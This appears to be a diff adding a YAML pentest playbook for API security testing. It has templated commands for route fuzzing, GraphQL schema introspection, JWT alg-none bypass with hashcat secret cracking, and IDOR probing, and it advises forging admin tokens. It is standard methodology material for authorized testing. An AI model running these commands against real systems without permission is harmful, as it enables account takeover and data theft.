@@ -1,0 +1,86 @@
+id: api-security
+name: API Security Testing (REST, GraphQL & JWT)
+category: web
+description: Comprehensive testing methodology for modern APIs including REST endpoints, GraphQL schema introspection, Broken Object Level Auth (BOLA/IDOR), Mass Assignment, JWT token tampering, and API fuzzing.
+port_triggers:
+  - 80
+  - 443
+  - 3000
+  - 5000
+  - 8000
+  - 8080
+  - 8443
+service_triggers:
+  - http
+  - https
+  - api
+  - graphql
+  - rest
+tags:
+  - api
+  - graphql
+  - jwt
+  - bola
+  - idor
+  - rest
+  - mass-assignment
+steps:
+  - id: api-kiterunner-fuzzing
+    title: API Route Discovery via Kiterunner & FFUF
+    phase: reconnaissance
+    purpose: Discover hidden REST API routes, API version prefixes (/v1, /v2, /api/v3), Swagger documentation, and OpenAPI schemas.
+    command: kr scan http://{{TARGET}}:{{PORT|80}}/ -w /usr/share/kiterunner/routes-large.kite --max-connection-per-host 20; ffuf -u http://{{TARGET}}:{{PORT|80}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -mc 200,204,301,302,401,403
+    expected_output:
+      - '[200] http://{{TARGET}}:{{PORT|80}}/api/v1/users'
+      - '[200] http://{{TARGET}}:{{PORT|80}}/swagger/v1/swagger.json'
+    common_mistakes:
+      - Always test alternate API prefixes like /api, /rest, /graphql, /v1, /v2, /internal/api.
+    if_success: API endpoints or Swagger documentation identified! Review API definitions for authentication schemas.
+    if_failure: No common routes discovered. Inspect client-side JavaScript files for hidden API paths.
+    references:
+      - https://github.com/assetnote/kiterunner
+      - https://portswigger.net/web-security/api-testing
+
+  - id: api-graphql-introspection
+    title: GraphQL Schema Introspection & Query Harvesting
+    phase: enumeration
+    purpose: Query GraphQL endpoint for full schema definitions, available mutations, internal queries, and hidden administrative types.
+    command: "curl -s -X POST http://{{TARGET}}:{{PORT|80}}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"query { __schema { types { name fields { name } } } }\"}' | jq ."
+    expected_output:
+      - '{"data": {"__schema": {"types": [{"name": "User", "fields": [...]}]}}}'
+    common_mistakes:
+      - "Try common GraphQL endpoints if /graphql fails: /api/graphql, /v1/graphql, /query, /api."
+    if_success: Schema dump obtained! Analyze types and mutations for unauthorized actions (e.g. deleteUser, updateRole).
+    if_failure: Introspection disabled by configuration. Try field suggestion fuzzing with clairvoyance or inql.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
+
+  - id: api-jwt-tampering-none-alg
+    title: JWT Algorithm None & Secret Key Cracking
+    phase: exploitation
+    purpose: Test JSON Web Tokens for alg none signature bypasses, weak HMAC secrets, and privilege claim tampering (role admin).
+    command: "jwt_tool {{JWT_TOKEN}} -X a; hashcat -m 16500 -a 0 '{{JWT_TOKEN}}' /usr/share/wordlists/rockyou.txt"
+    expected_output:
+      - '[+] Vulnerability Found: alg: none accepted by server!'
+      - '{{JWT_TOKEN}}:secret123'
+    common_mistakes:
+      - "When testing alg: none, try none, None, NONE, and nOnE with empty signature trailing dot (header.payload.)."
+    if_success: Signature bypassed or HMAC key cracked! Forge token with role admin, is_admin true.
+    if_failure: Server strictly verifies RS256/ES256 signatures. Check JWKS injection or key confusion attacks.
+    references:
+      - https://github.com/ticarpi/jwt_tool
+      - https://portswigger.net/web-security/jwt
+
+  - id: api-bola-idor-testing
+    title: Broken Object Level Authorization (BOLA / IDOR)
+    phase: exploitation
+    purpose: Test API resource identifiers (/api/v1/users/{id}, /api/v1/orders/{orderId}) with horizontal and vertical privilege escalation IDs.
+    command: "curl -s -H 'Authorization: Bearer {{AUTH_TOKEN}}' http://{{TARGET}}:{{PORT|80}}/api/v1/users/1; curl -s -H 'Authorization: Bearer {{AUTH_TOKEN}}' http://{{TARGET}}:{{PORT|80}}/api/v1/users/2"
+    expected_output:
+      - '{"id": 1, "username": "admin", "email": "admin@corp.local", "role": "superadmin"}'
+    common_mistakes:
+      - If integer IDs are rejected, test GUIDs, email addresses, or base64 decoded parameters.
+    if_success: Unauthorized access to other users data confirmed (BOLA)!
+    if_failure: Endpoint enforces strict ownership checks. Test PUT/DELETE methods for mutation bypasses.
+    references:
+      - https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
